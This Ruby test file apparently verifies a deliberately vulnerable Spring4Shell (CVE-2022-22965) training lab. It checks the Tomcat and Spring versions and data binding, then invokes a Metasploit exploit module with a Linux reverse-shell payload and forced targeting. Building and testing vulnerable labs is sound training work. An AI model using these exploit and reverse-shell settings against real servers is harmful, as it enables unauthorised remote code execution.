require_relative '../../../../../lib/post_provision_test'

# Spring4Shell (CVE-2022-22965): a Spring MVC 5.3.17 app on Apache Tomcat 8.5.77.
# tier 1 proves Tomcat and the vulnerable WAR are installed and a JDK is present.
# tier 2 proves the app serves and that both halves of the vulnerable combination
#   are in place: Spring Framework 5.3.17 (in the vulnerable 5.3.0-5.3.17 range)
#   and Tomcat 8.5.77 (before the 8.5.78 AccessLogValve hardening). The HTTP check
#   drives the data-binding sink itself (the page echoes request parameters bound
#   onto a POJO), which is the exact mechanism the exploit abuses.
# tier 3 (exploit) is deferred to the attacker-VM test (see the stub below).
#
# Parameterisation: the module declares no <read_fact>, so there are no
# build-time inputs to thread through json_inputs. The port (8080), install path
# (/opt/tomcat) and web root (ROOT -> /) are fixed by the module, so they are
# asserted as literals here.
class Spring4shellRceTest < PostProvisionTest
  CATALINA = '/opt/tomcat'.freeze

  def initialize
    self.module_name = 'spring4shell_rce'
    self.module_path = get_module_path(__FILE__)
    super
    self.port = 8080 # no 'port' input; the module serves on a fixed 8080
  end

  def test_module
    super

    tier(1) do
      test_local_command('Tomcat installed',
                         "test -x #{CATALINA}/bin/catalina.sh && echo ok", 'ok')
      test_local_command('vulnerable WAR deployed',
                         "test -f #{CATALINA}/webapps/ROOT.war && echo ok", 'ok')
      test_local_command('JDK present (exploit needs JDK 9+)',
                         'test -x /usr/bin/java && echo ok', 'ok')
    end

    tier(2) do
      test_service_up

      # The app renders the request parameters bound onto a Person POJO; a hit on
      # our probe proves both that Tomcat has deployed the app and that the
      # data-binding sink is live. Retry while Tomcat starts and unpacks the WAR.
      test_local_command('Spring MVC app serves and binds request params',
                         "for i in $(seq 1 30); do " \
                         "curl -s 'http://127.0.0.1:8080/?name=SecGenProbe&age=42' " \
                         "| grep -q 'Hello, my name is SecGenProbe' && { echo APP_OK; break; }; " \
                         "sleep 3; done", 'APP_OK')

      # Confirm the vulnerable Spring Framework version is the one deployed
      # (unpacked into webapps/ROOT once Tomcat has started).
      test_local_command('vulnerable Spring Framework 5.3.17 deployed',
                         "ls #{CATALINA}/webapps/ROOT/WEB-INF/lib/ 2>/dev/null", 'spring-core-5.3.17.jar')

      # Confirm Tomcat predates the 8.5.78 AccessLogValve hardening (static file,
      # so the check needs no Java/CATALINA_HOME environment).
      test_local_command('Tomcat 8.5.77 (pre-8.5.78 valve hardening)',
                         "grep -i 'Apache Tomcat Version' #{CATALINA}/RELEASE-NOTES", '8.5.77')
    end

    # Spring4Shell yields an interactive session rather than a command/sentinel
    # payload, so the exploit is verified by running a command inside the session
    # it opens (test_msf_exploit_session), not by a sentinel. The module's default
    # java JSP shell payloads don't compile under this build's Jasper (the
    # fragmented local-class webshell 500s), so we use the module's Linux dropper
    # target (TARGET 1) with a native linux reverse shell, which lands reliably and
    # opens a shell session as the tomcat user. TARGETURI '/' is where the app
    # binds request params; force skips the module's auto-check (it false-negatives
    # on this genuinely vulnerable build: Spring 5.3.17 / Tomcat 8.5.77 / JDK 9+).
    tier(3) do
      test_msf_exploit_session('exploit/multi/http/spring_framework_rce_spring4shell',
                               rport: 8080,
                               options: { 'TARGETURI' => '/', 'TARGET' => 1 },
                               force: true,
                               payload: 'linux/x64/shell_reverse_tcp',
                               tier: 3)
    end
  end
end

Spring4shellRceTest.new.run
